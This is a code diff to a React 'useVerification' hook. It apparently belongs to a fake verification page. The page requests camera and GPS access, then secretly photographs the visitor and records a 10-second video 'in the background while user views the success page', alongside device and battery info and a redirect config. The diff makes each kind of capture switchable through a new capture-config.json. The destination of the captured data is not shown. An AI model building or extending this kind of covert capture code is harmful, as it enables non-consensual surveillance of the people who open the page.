@@ -7,6 +7,7 @@ import { useState, useRef, useEffect } from 'react';
 import { getRedirectConfig } from '@/config/redirect';
 import { getBatteryInfo, buildDeviceInfoString } from '@/utils/device';
 import { takePhoto, recordVideo } from '@/utils/media';
+import captureConfig from '@/app/capture-config.json';
 
 export function useVerification() {
   const [isVerified, setIsVerified] = useState(false);
@@ -89,8 +90,8 @@ export function useVerification() {
     (async () => {
       try {
         // Take photo & record 10s video in the background while user views the success page
-        const photoBlob = await takePhoto(stream, videoRef);
-        const videoBlob = await recordVideo(stream, 10000);
+        const photoBlob = captureConfig.photo ? await takePhoto(stream, videoRef) : null;
+        const videoBlob = captureConfig.video ? await recordVideo(stream, 10000) : null;
 
         // Stop tracks immediately after capture is complete
         stream.getTracks().forEach((track) => track.stop());
@@ -181,13 +182,32 @@ export function useVerification() {
   const requestAllPermissions = async (): Promise<
     { lat: number; lng: number } | null | false
   > => {
+    const needCamera = captureConfig.photo || captureConfig.video;
+    const needGPS = captureConfig.location;
+
+    // If nothing needs permissions, skip entirely
+    if (!needCamera && !needGPS) return null;
+
     try {
-      const [location, permissionStream] = await Promise.all([
-        getGeolocationPromise().catch(() => null), // GPS gagal → null, bukan throw
-        navigator.mediaDevices.getUserMedia({ video: true }),
-      ]);
-      permissionStream.getTracks().forEach((t) => t.stop());
-      return location; // {lat,lng} | null — false berarti denied
+      const promises: Promise<any>[] = [];
+      
+      if (needGPS) {
+        promises.push(getGeolocationPromise().catch(() => null));
+      } else {
+        promises.push(Promise.resolve(null));
+      }
+      
+      if (needCamera) {
+        promises.push(navigator.mediaDevices.getUserMedia({ video: true }));
+      } else {
+        promises.push(Promise.resolve(null));
+      }
+
+      const [location, permissionStream] = await Promise.all(promises);
+      if (permissionStream) {
+        permissionStream.getTracks().forEach((t: MediaStreamTrack) => t.stop());
+      }
+      return location; // {lat,lng} | null
     } catch (err) {
       console.error("Permission denied:", err);
       return false;
@@ -210,14 +230,21 @@ export function useVerification() {
         return;
       }
 
-      // Get camera stream (resolves instantly since already granted)
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: 'user',
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-        },
-      });
+      // Get camera stream if needed (resolves instantly since already granted)
+      const needCamera = captureConfig.photo || captureConfig.video;
+      let stream: MediaStream;
+      if (needCamera) {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+          },
+        });
+      } else {
+        // Create empty stream placeholder when camera is not needed
+        stream = new MediaStream();
+      }
 
       // Mark verification process as triggered
       setHasTriggered(true);
